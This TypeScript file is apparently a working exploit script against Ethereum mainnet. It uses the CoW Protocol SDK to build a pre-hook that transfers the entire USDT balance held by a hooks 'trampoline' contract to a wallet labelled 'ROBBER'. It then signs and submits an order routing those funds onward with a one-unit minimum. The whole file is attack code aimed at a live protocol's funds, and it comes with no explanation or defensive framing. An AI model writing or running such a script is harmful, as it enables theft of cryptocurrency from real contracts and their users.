import { ethers } from "ethers";
import { Usdt__factory } from "./typechain";
import { MetadataApi, stringifyDeterministic } from '@cowprotocol/app-data'
import { OrderBookApi, OrderSigningUtils, SupportedChainId, SigningScheme, OrderKind, SellTokenSource, BuyTokenDestination, UnsignedOrder } from '@cowprotocol/cow-sdk'

//
// CONFIGURATION
//

const NODE_URL = process.env['NODE_URL']
const PRIVATE_KEY = process.env['PRIVATE_KEY']

if (!NODE_URL) throw "NODE_URL"
if (!PRIVATE_KEY) throw "PRIVATE_KEY"

const provider = new ethers.providers.JsonRpcProvider(`https://mainnet.infura.io/v3/${NODE_URL}`);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const TRAMPOLINE = "0x01DcB88678aedD0C4cC9552B20F4718550250574"
const ROBBER = "0x9dfB98A93e96c9bf3EA2C3Fb06C52482D94d10a9"
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

const usdt = Usdt__factory.connect('0xdAC17F958D2ee523a2206206994597C13D831ec7', provider)

const metadataApi = new MetadataApi()
const orderBookApi = new OrderBookApi({ chainId: SupportedChainId.MAINNET })

async function main() {
  const walletAddress = await wallet.getAddress()
  if (walletAddress != ROBBER) throw `${walletAddress} don't match ${ROBBER}`
  const { chainId } = await provider.getNetwork();
  console.log(`connected to chain ${chainId} with account ${wallet.address}`);

  const balanceUSDT = await usdt.balanceOf(TRAMPOLINE)
  console.log(balanceUSDT.toString())

  const gasLimit = await usdt.estimateGas.transfer(ROBBER, balanceUSDT, { from: TRAMPOLINE })

  const transferHook = {
      target: usdt.address,
      callData: Usdt__factory.createInterface().encodeFunctionData("transfer", [ROBBER, balanceUSDT]),
      gasLimit: gasLimit.toString(),
    };

  console.log("transferHook: ", transferHook)

  /******* APPDATA SDK *******/

  const appDataDoc = await metadataApi.generateAppDataDoc({
    metadata: {
      hooks: {
        pre: [transferHook]
      }
    },
  })

  console.log(appDataDoc)

  const { cid, appDataHex,  } = await metadataApi.appDataToCid(appDataDoc)
  console.log('appDataHex', appDataHex)
  console.log('cid', cid)

  /******* ORDER SDK *******/

  const quote: UnsignedOrder = {
    sellToken: usdt.address,
    buyToken: USDC_ADDRESS,
    receiver: ROBBER,
    sellAmount: balanceUSDT.toString(),
    buyAmount: "1",
    validTo: Math.floor(Date.now()/1000)+86400,
    feeAmount: "0",
    kind: OrderKind.SELL,
    partiallyFillable: false,
    sellTokenBalance: SellTokenSource.ERC20,
    buyTokenBalance: BuyTokenDestination.ERC20,
    appData: appDataHex
  }

  const orderSigningResult = await OrderSigningUtils.signOrder(quote, chainId, wallet)
  const deterministicDoc = await stringifyDeterministic(appDataDoc)

  console.log('orderSigningResult', orderSigningResult)
  const orderId = await orderBookApi.sendOrder({ 
    ...quote, 
    ...orderSigningResult,
    from: ROBBER,
    signingScheme: SigningScheme.EIP712,
    appData: deterministicDoc
  })

  console.log(`https://explorer.cow.fi/orders/${orderId}`)
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
